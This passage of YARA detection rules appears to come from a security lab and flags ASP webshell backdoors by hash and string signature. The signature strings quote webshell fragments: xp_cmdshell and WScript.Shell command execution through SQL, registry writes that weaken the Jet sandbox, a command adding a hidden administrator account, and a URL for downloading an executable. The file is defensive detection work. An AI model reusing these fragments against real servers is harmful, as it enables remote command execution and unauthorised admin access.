        $s2 = "STRQUERY = \"DROP TABLE [JNC];DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /" fullword ascii
        $s3 = "ODE','REG_DWORD',1;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.E" ascii
        $s4 = "STRQUERY = \"EXEC MASTER.DBO.XP_CMDSHELL '\" & REQUEST.FORM(\"CMD\") & \"'\" " fullword ascii
        $s5 = "STRQUERY = \"CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);USE MASTER DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL'," fullword ascii
        $s6 = "@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /C \"&REQUEST(\"CMD\")&\" > 8617.TMP',0,TRUE;BULK INSERT [JNC] FROM '8617.TMP' WITH (" ascii
        $s7 = "STRQUERY = \"USE MSDB CREATE TABLE [JNCSQL](RESULTTXT NVARCHAR(1024) NULL) EXEC SP_DELETE_JOB NULL,'X' EXEC SP_ADD_JOB 'X'" fullword ascii
        $s8 = "RESPONSE.WRITE \"  <INPUT NAME=SQLAAA TYPE=SUBMIT VALUE=LOGIN>\"" fullword ascii
        $s9 = "C COPY 8617.TMP JNC.TMP\"&CHR(34)&\")');BULK INSERT [JNC] FROM 'JNC.TMP' WITH (KEEPNULLS);\"" fullword ascii
        $s10 = "STRQUERY = \"DROP TABLE [JNC];EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\\MICROSOFT\\JET\\4.0\\ENGINES','SANDBOXM" fullword ascii
        $s11 = "STRQUERY = \"CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\\MIC" fullword ascii
        $s12 = "EXEC SP_ADD_JOBSTEP NULL,'X',NULL,'1','CMDEXEC','CMD /C \"&REQUEST.FORM(\"CMD\")&\"' EXEC SP_ADD_JOBSERVER NULL,'X',@@SERVERNAME" ascii
        $s13 = "RESPONSE.WRITE \"  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=CMD>\"" fullword ascii
        $s14 = "C DEL 8617.TMP&&DEL JNC.TMP\"&CHR(34)&\")');\"" fullword ascii
        $s15 = "ELSE                       RESPONSE.WRITE \"<FORM NAME=FORM METHOD=POST SQLAAA=\"&REQUEST.SERVERVARIABLES(\"URL\")&\">\"" fullword ascii
        $s16 = "SESSION(\"XP_CMDSHELL\")=0 " fullword ascii
        $s17 = "SESSION(\"XP_CMDSHELL\")=1 " fullword ascii
        $s18 = "SELECT SHELL(\"&CMD&\")');\"" fullword ascii
        $s19 = "ADOCONN.OPEN \"PROVIDER=SQLOLEDB.1;DATA SOURCE=\" & REQUEST.FORM(\"SERVER\") & \",\" & REQUEST.FORM(\"PORT\") & \";PASSWORD=\" &" ascii
        $s20 = "ADOCONN.OPEN \"PROVIDER=SQLOLEDB.1;DATA SOURCE=\" & SESSION(\"SERVER\") & \",\" & SESSION(\"PORT\") & \";PASSWORD=\" & SESSION(" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _3d7cd32d53abc7f39faed133e0a8f95a09932b64_4c9c9d31ceadee0db4bc592d8585d45e5fd634e7_9065860c36557b5843d1a433100610d2054762be__55
{
     meta:
        description = "asp - from files 3d7cd32d53abc7f39faed133e0a8f95a09932b64.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e01aae01ad2c1ae96b5445075d651e7b0e7e0f5649fe2def96525ec4e19b8eaf"
        hash2 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
        hash3 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
        hash4 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
        hash5 = "6349389d6fab3bf660f74fe4d224aea7b7b74f49546e3713dd4f42d3760c9396"
        hash6 = "4a95904b0998d9073f7c9c587aad82bb4bb0bc63d11790285ef6735aacf603ff"
        hash7 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
     strings:
        $x1 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&ScriptPath&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s2 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
        $s3 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
        $s4 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s5 = "j cdx&\"<a href='?Action=CustomScanDriveForm' target='FileFrame'>\"&cxd&\"  <font color=red>" fullword ascii
        $s6 = "j cdx&\"<a href='?Action=delpoint' target='FileFrame'>\"&cxd&\"  <font color=red>" fullword ascii
        $s7 = "<a>   <a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s8 = "<a><a class=am href='javascript:ShowFolder(\"\"e:\\\\recycler\"\")'>(10)" fullword ascii
        $s9 = "j cdx&\"<a href='?Action=ProFile' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s10 = "<a><a class=am href='javascript:ShowFolder(\"\"D:\\\\recycler\"\")'>(9)" fullword ascii
        $s11 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\recycler\"\")'>(8)" fullword ascii
        $s12 = "#000000'></td><td width=1 style='padding:2px'><a onclick=\"\"document.getElementById('tl').style.display='none'\"\" href=##><b>" fullword ascii
        $s13 = "j \"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
        $s14 = "<a><a  class=am href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\ServU\"\")'>(4)" fullword ascii
        $s15 = "j\"<td><a class=am href='javascript:ShowFolder(\"\"C:\\\\Program Files\"\")'>(1)" fullword ascii
        $s16 = "<a><a class=am href='javascript:ShowFolder(\"\"d:\\\\Program Files\"\")'>(2)" fullword ascii
        $s17 = "<a><a class=am href='javascript:ShowFolder(\"\"e:\\\\Program Files\"\")'>(3)" fullword ascii
        $s18 = "j \"<form name=\"\"hideform\"\" method=\"\"post\"\" action=\"\"\"&URL&\"\"\" target=\"\"FileFrame\"\"><input type=\"\"hidden\"\"" ascii
        $s19 = "j(targetip & \":\" & portNum & \"........." fullword ascii
        $s20 = "<a><a class=am href='javascript:ShowFolder(\"\"c:\\\\prel\"\")'>(8)" fullword ascii
     condition:
        ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _081a73a1b23769a55b9107e518f85f476e902309_115b3ee52583fdbabeeb9814038f7bc25fb8e3bd_143df8e735a7a776468700150dc64008f7944e01__56
{
     meta:
        description = "asp - from files 081a73a1b23769a55b9107e518f85f476e902309.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
        hash2 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
        hash3 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
        hash4 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
        hash5 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
        hash6 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
        hash7 = "58fcf3d1e1d58fa507b6ea15f185cbf7fa541f8739c37d47cfd8b6eb705bff72"
        hash8 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
        hash9 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
        hash10 = "171dd57587534ad60299f0df33b6250a5b9534cf2e8cf91ed2c22da07c46bfb4"
        hash11 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
        hash12 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
        hash13 = "3ad57c8544ad8d05128a0343399b32ce94d916e1445b455e7b6c933d5393871c"
     strings:
        $s1 = "RRS\"<tr><td height='21'><a href='?Action=Cmd1Shell' target='FileFrame'>" fullword ascii
        $s2 = "RRS\"<tr><td height='21'><a href='?Action=hiddenshell' target='FileFrame'>" fullword ascii
        $s3 = "RRS\"<tr><td height='21'><a href='?Action=ReadREG' target='FileFrame'>" fullword ascii
        $s4 = "Re~)`ath~)hellPon(~SSessiPath=Shell`md.ex = ~clPath Shel Thenth=~~ellPaif She~`heckehen ces~ t)<>~yript~(~wscquestif Red=~~`cmd" fullword ascii
        $s5 = "RRS\"<tr><td height='21'><a href='?Action=Logout' target='_top'>" fullword ascii
        $s6 = "RRS\"<tr><td height='21'><a href='?Action=DbManager' target='FileFrame'>" fullword ascii
        $s7 = "RRS\"<tr><td height='21'><a href='?Action=PageAddToMdb' target='FileFrame'>" fullword ascii
        $s8 = "RRS\"<tr><td height='21'><a href='?Action=ScanPort' target='FileFrame'>" fullword ascii
        $s9 = "RRS\"<tr><td height='21'><a href='?Action=ServerInfo' target='FileFrame'>" fullword ascii
        $s10 = "RRS\"<tr><td height='21'><a href='?Action=getTerminalInfo' target='FileFrame'>" fullword ascii
        $s11 = "RRS\"<tr><td height='21'><a href='?Action=Cplgm&M=1' target='FileFrame'>" fullword ascii
        $s12 = "RRS\"<tr><td height='21'><a href='?Action=Cplgm&M=2' target='FileFrame'>" fullword ascii
        $s13 = "RRS\"<tr><td height='21'><a href='?Action=php' target='FileFrame'>" fullword ascii
        $s14 = "RRS\"<tr><td height='21'><a href='?Action=adminab' target='FileFrame'>" fullword ascii
        $s15 = "RRS\"<tr><td height='21'><a href='?Action=aspx' target='FileFrame'>" fullword ascii
        $s16 = "RRS\"<tr><td height='21'><a href='?Action=MMD' target='FileFrame'>" fullword ascii
        $s17 = "RRS\"<tr><td height='21'><a href='?Action=jsp' target='FileFrame'>" fullword ascii
        $s18 = "RRS\"<tr><td height='21'><a href='?Action=att' target='FileFrame'>" fullword ascii
        $s19 = "RRS\"<tr><td height='21'><a href='?Action=Course' target='FileFrame'>" fullword ascii
        $s20 = "RRS\"<tr><td height='21'><a href='?Action=Servu' target='FileFrame'>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _3d7cd32d53abc7f39faed133e0a8f95a09932b64_4c9c9d31ceadee0db4bc592d8585d45e5fd634e7_9c20d975e571892b9dd0acc47deffbea13351009__57
{
     meta:
        description = "asp - from files 3d7cd32d53abc7f39faed133e0a8f95a09932b64.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e01aae01ad2c1ae96b5445075d651e7b0e7e0f5649fe2def96525ec4e19b8eaf"
        hash2 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
        hash3 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
        hash4 = "4a95904b0998d9073f7c9c587aad82bb4bb0bc63d11790285ef6735aacf603ff"
     strings:
        $s1 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
        $s2 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
        $s3 = "j cdx&\"<a href='\"&htp&\"t00ls.asp' target='FileFrame'>\"&cxd&\" <font color=green>" fullword ascii
        $s4 = "j cdx&\"<a href='?Action=ScanDriveForm' target='FileFrame'>\"&cxd&\" <font color=chocolate>" fullword ascii
        $s5 = "j cdx&\"<a href='?Action=MMD' target='FileFrame'>\"&cxd&\" <font color=Turquoise>SQL-----SA\"&ef" fullword ascii
        $s6 = "j cdx&\"<a href='?Action=ScanPort' target='FileFrame'>\"&cxd&\" <font color=yellow>" fullword ascii
        $s7 = "j cdx&\"<a href='?Action=radmin' target='FileFrame'>\"&cxd&\" <font color=Turquoise>Radmin" fullword ascii
        $s8 = "j cdx&\"<a href='?Action=suftp' target='FileFrame'>\"&cxd&\" <font color=Turquoise>Su---FTP" fullword ascii
        $s9 = "j cdx&\"<a href='?Action=Servu' target='FileFrame'>\"&cxd&\" <font color=Turquoise>Servu-" fullword ascii
        $s10 = "j cdx&\"<a href='?Action=Course' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s11 = "j cdx&\"<a href='?Action=pcanywhere4' target='FileFrame'>\"&cxd&\" <font color=Turquoise>Pcanywhere\"&ef" fullword ascii
        $s12 = "j cdx&\"<a href='?Action=php' target='FileFrame'>\"&cxd&\" <font color=gold>" fullword ascii
        $s13 = "j cdx&\"<a href='?Action=Alexa' target='FileFrame'>\"&cxd&\" <font color=green>" fullword ascii
        $s14 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin7s$ 1 /add & net localgroup administrators admin7s$ /add'" ascii
        $s15 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin7s$ 1 /add & net localgroup administrators admin7s$ /add'" ascii
        $s16 = "j \"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
        $s17 = "j cdx&\"<a href='javascript:ShowFolder(\"\"\"&RePath(RootPath)&\"\"\")'>\"&cxd&\" <font color=violet>" fullword ascii
        $s18 = "\":end if:j\"<br><a class=am href='javascript:ShowFolder(\"\"C:\\\\wmpub\"\")'>(1)" fullword ascii
        $s19 = "00px;padding:32px; align=left'><br><form action='\"&url&\"' method='post'><b>" fullword ascii
        $s20 = "j\"<tr><td onClick=\"\"MM_show('menud')\"\"><input onMouseOver=\"\"this.style.cursor='hand'\"\" type=button value='" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _115b3ee52583fdbabeeb9814038f7bc25fb8e3bd_407d226bec41e067ad9e434e8fdfc2bb49752b7b_4396d18ce40744025fec91ae4daa5066a9573c82__58
{
     meta:
        description = "asp - from files 115b3ee52583fdbabeeb9814038f7bc25fb8e3bd.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
        hash2 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
        hash3 = "b3d59d237cf654294c4be9c4887da8c43c5ad0bef70deeea9aa424f890135cb7"
        hash4 = "4aec9fa7db3a127fb642cfbc4e2af85e9f46f496e30aeea9232f5a002aa07ac8"
        hash5 = "58fcf3d1e1d58fa507b6ea15f185cbf7fa541f8739c37d47cfd8b6eb705bff72"
        hash6 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
        hash7 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
        hash8 = "fd91d593a7c083e8929aa298214373b335879e385c842041469bed945c580df5"
        hash9 = "2838b2bff6e6a4908447291924eabd30eab582b14bb3ac2ac5f3f97851f33cfc"
        hash10 = "171dd57587534ad60299f0df33b6250a5b9534cf2e8cf91ed2c22da07c46bfb4"
        hash11 = "3ad57c8544ad8d05128a0343399b32ce94d916e1445b455e7b6c933d5393871c"
     strings:
        $s1 = "Response.Write \"<input name='NoCheckTemp' type='checkbox' id='NoCheckTemp' checked='checked' />\"" fullword ascii
        $s2 = "Response.Write \"<form id='form1' name='form1' method='post' action=''>\"" fullword ascii
        $s3 = "Response.Write \"<label for='NoCheckTemp'>\"" fullword ascii
        $s4 = "Response.Write \"<input name='CheckNextDir' type='checkbox' id='CheckNextDir' checked='checked' />" fullword ascii
        $s5 = "Response.Write \"<input name='CheckFile' type='checkbox' id='CheckFile' checked='checked'  />" fullword ascii
        $s6 = "if (CheckNextDir=True) and (IS_TEMP_DIR=false) then '" fullword ascii
        $s7 = "if Right(path,1) <> \"\\\" then GetFullPath = path&\"\\\" '" fullword ascii
        $s8 = "Response.Write \"<input name='ShowNoWrite' type='checkbox' id='ShowNoWrite'/>\"" fullword ascii
        $s9 = "(instr(UCase(Path),\"WINDOWS\\TEMP\")>0) and NoCheckTemp" fullword ascii
        $s10 = "Response.Write \"<input type='submit' name='button' value='" fullword ascii
        $s11 = "'==========================================================================" fullword ascii
        $s12 = "IS_TEMP_DIR =" fullword ascii
        $s13 = "Path = GetFullPath(Path) '" fullword ascii
        $s14 = "Response.Write \"<label for='CheckFile'>\"" fullword ascii
        $s15 = "Response.Write \"<label for='ShowNoWrite'>\"" fullword ascii
        $s16 = "Response.Write \"<label for='CheckNextDir'>\"" fullword ascii
        $s17 = "Response.Write  \"<a href=\"\"?\"\">" fullword ascii
        $s18 = "ShowDirWrite_Dir_File Path&file.name,CheckFile,CheckNextDir '" fullword ascii
        $s19 = "if ShowNoWriteDir then Response.Write \"[<font color=red>" fullword ascii
        $s20 = "Response.Write \"[<font color=red>" fullword ascii
     condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x483c ) and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _3d7cd32d53abc7f39faed133e0a8f95a09932b64_ad42d54b65d7d1f6b0e2dd97ff8bab3547446f13_59
{
     meta:
        description = "asp - from files 3d7cd32d53abc7f39faed133e0a8f95a09932b64.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e01aae01ad2c1ae96b5445075d651e7b0e7e0f5649fe2def96525ec4e19b8eaf"
        hash2 = "4a95904b0998d9073f7c9c587aad82bb4bb0bc63d11790285ef6735aacf603ff"
     strings:
        $x1 = "j cdx&\"<a href='http://sb178.com/' target='FileFrame'>\"&cxd&\" <font color=garnet>" fullword ascii
        $x2 = "</b><input type=text name=P VALUES=123456>?<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If trim(req" ascii
        $s3 = "est.form(\"MMD\") & \"'\":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResu" ascii
        $s4 = "<a>????<a class=am href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
        $s5 = "j cdx&\"<a href='\"&htp&\"Updates.asp' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s6 = "nection\"):adoConn.Open \"Provider=SQLOLEDB.1;Password=\"&password&\";User ID=\"&id:strQuery = \"exec master.dbo.xp_cMdsHeLl '\"" ascii
        $s7 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\Temp\"\")'>??(2)" fullword ascii
        $s8 = "admin7s.govedu@h4ck2b.com" fullword ascii
        $s9 = "durl=\"http://sb178.com//web/pr.exe\"  '" fullword ascii
        $s10 = "<a>??????<a  class=am href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\Microsoft SQL Server\\\\\"\")'>(7)" fullword ascii
        $s11 = "bg =\"http://sb178.com/bg/1.jpg\"  '" fullword ascii
        $s12 = "htp=\"http://sb178.com/web/\"  '" fullword ascii
        $s13 = "SItEuRl=\"http://sb178.com/\" '" fullword ascii
        $s14 = "</b><input type=text name=MMD size=35 value=\"\"ipconfig\"\" >?<b id=x>UserName" fullword ascii
        $s15 = "</font ></b> <br><br><br><br><b><div align=center><font size='14' color='lime'></font></b></p></center>\"&backurl" fullword ascii
        $s16 = "</b><input type=text name=U value=sa>?<b id=x>Password" fullword ascii
        $s17 = "</b><input type=text name=P VALUES=123456>?<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If trim(req" ascii
        $s18 = "<a>??<a class=am href='javascript:ShowFolder(\"\"C:\\\\php\"\")'>(6)" fullword ascii
        $s19 = "<a>?<a class=am href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\"\")'>(5)" fullword ascii
        $s20 = "j cdx&\"<a href='javascript:ShowFolder(\"\"\"&D.DriveLetter&\":\\\\\"\")'>?" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _115b3ee52583fdbabeeb9814038f7bc25fb8e3bd_1687747b3f79f880735ae0f762baa52b03a96c36_21fd0ada0d0c86b6899d5b7af4b55e72884a5513__60
{
     meta:
        description = "asp - from files 115b3ee52583fdbabeeb9814038f7bc25fb8e3bd.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
        hash2 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
        hash3 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
        hash4 = "e01aae01ad2c1ae96b5445075d651e7b0e7e0f5649fe2def96525ec4e19b8eaf"
        hash5 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
        hash6 = "bc041032ed36879be7e068d17db8fdbe4c251596276fba1cc4f8ac8efa2bae34"
        hash7 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
        hash8 = "a6f8ff3c66b27b37b827240b4c3ceb07ba851d4d2693d448aaf2710f16f7b776"
        hash9 = "3d7e1a7c12de2ddcb755a97d769df635c5a22f0ca844700129d3cdac6c65e13c"
        hash10 = "05808124f9e09365b3402b6d39ede828e316299cbd05a5ca9befa8a6f12ef814"
        hash11 = "640ef6949c07edc04c8ce29ffb49efc70efc75fd6304c1a9203134ba3b51d0a9"
        hash12 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
        hash13 = "58fcf3d1e1d58fa507b6ea15f185cbf7fa541f8739c37d47cfd8b6eb705bff72"
        hash14 = "7580a31513ba4719a1eb7fd037b7d8b1ec13077605936d8e1b87965c3429010e"
        hash15 = "39e42a7d88da56b57f095012aa94590ece4ee28b01984abbe366a52434f4c38c"
        hash16 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
        hash17 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
        hash18 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
        hash19 = "6349389d6fab3bf660f74fe4d224aea7b7b74f49546e3713dd4f42d3760c9396"
        hash20 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
        hash21 = "4a95904b0998d9073f7c9c587aad82bb4bb0bc63d11790285ef6735aacf603ff"
        hash22 = "171dd57587534ad60299f0df33b6250a5b9534cf2e8cf91ed2c22da07c46bfb4"
        hash23 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
        hash24 = "fbfdd9aca6c7ddb7c2ed97f1852f1b9896a6149874c5b4163186fb71a32ded2f"
        hash25 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
        hash26 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
        hash27 = "ce13b9dcf134bea0a6766c65f8229455bbe3fabae225018fcf252f091aefb019"
        hash28 = "46487a3f8ee782d4cc95b98f5f7ebef6d8de4f0858cf33cd700d576a4b770251"
        hash29 = "65dbdb94717f956d1529eae468447f65f95a91f16019173aa740894845abc1d3"
        hash30 = "4334d3b9d075e530187d23cd7f8f067de67c3a94e6888335d8b0d4c9ca4a9187"
        hash31 = "7f4139601930bba578adbd3f152397f7396688744df2b231b2fcaa90e36a995f"
        hash32 = "5a40df588e079dc1abda3c3273579aa9ecf0f600f722e4e92cbc4cdc0703a38d"
        hash33 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
        hash34 = "3ad57c8544ad8d05128a0343399b32ce94d916e1445b455e7b6c933d5393871c"
        hash35 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
     strings:
        $s1 = "If FSO.FolderExists(Drive & \":\\\" & TempFolderList(i)) Then" fullword ascii
        $s2 = "\" & ScReWr(Drive & \":\\\" & TempFolderList(i))" fullword ascii
        $s3 = "TempFolderList = Array(\"windows\",\"winnt\",\"win\",\"win2000\",\"win98\",\"web\",\"winme\",\"windows2000\",\"asp\",\"php\",\"T" ascii
        $s4 = "If t=0 then Temp_Str = Temp_Str & \"<LI>" fullword ascii
        $s5 = "Set TempFolders = BaseFolder.SubFolders" fullword ascii
        $s6 = "Set TempFolders = OFolder.SubFolders" fullword ascii
        $s7 = "Temp_Str = Temp_Str & \"<LI>\" & Red(\"" fullword ascii
        $s8 = "For i = 0 to Ubound(TempFolderList)" fullword ascii
        $s9 = "Dim FSO,OFolder,TempFolder,Scmsg,S" fullword ascii
        $s10 = "Set TempFolder = Nothing" fullword ascii
        $s11 = "Set TempFolders = Nothing" fullword ascii
        $s12 = "For Each S in TempFolders" fullword ascii
        $s13 = "For Each D in TempFolders" fullword ascii
        $s14 = "Temp_Str = \"<LI>" fullword ascii
        $s15 = "Set OFolder = FSO.GetFolder(folder)" fullword ascii
        $s16 = "Set TestDrive = FSO.GetDrive(Drive)" fullword ascii
        $s17 = "\",Temp_Str,1" fullword ascii
        $s18 = "Set BaseFolder = TestDrive.RootFolder" fullword ascii
        $s19 = "\" & Red(TestDrive.ShareName) & \"<LI>" fullword ascii
        $s20 = "\" & Red(TestDrive.FileSystem) & \"<LI>" fullword ascii
     condition:
        ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}
